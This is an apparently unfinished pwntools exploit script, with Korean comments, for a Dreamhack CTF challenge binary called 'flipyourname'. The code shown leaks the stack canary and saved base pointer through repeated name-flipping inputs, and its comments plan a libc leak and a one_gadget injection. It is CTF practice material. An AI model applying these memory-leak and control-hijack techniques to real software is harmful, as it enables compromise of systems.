from pwn import *

# 카나리 릭
# libc leak & pie leak
# 크기 조작, one_gadget 주입

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

HOST, PORT = 'host8.dreamhack.games 1234'.split()

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    #p = remote('localhost', 80)
    p = process('./flipyourname')

e = ELF('./flipyourname')
libc = ELF('./libc.so.6')

# memset으로 일부 초기화 됨. 그리고 카나리의 첫 바이트까지 널이므로 이를 제거 후 카나리 7바이트를 출력하게 만들기
pay = b'A'*0x50 # 80, 변조되지 않은 지금의 크기

for i in range(81, 88+1):
    p.sendafter(b'name? ', pay) # 버퍼 덮고(0x50만큼 항상 memset됨)
    p.sendlineafter(b'flip your name :) ', str(i).encode())
    p.sendlineafter(b'want to quit? ', b'n')

p.sendafter(b'name? ', pay)
p.sendlineafter(b'flip your name :) ', str(0x50).encode()) # 이후는 널 제거 했으니 이제 buf의 끝에서 널만 없애면 됨
res = p.sendlineafter(b'want to quit? ', b'n')

print(res)

cnry = u64(b'\x00' + res.split(b'A'*0x50)[1][9:16])
print("cnry", hex(cnry))

sfp = u64(res.split(b'A'*0x50)[1][16:22].ljust(8, b'\x00'))
print("rbp", hex(sfp))
name_addr = sfp-0x70 # rbp-0x60, 근데 주어진 sfp-0x70부터 버퍼가 위치함.

gdb.attach(p)

pause()



p.interactive()
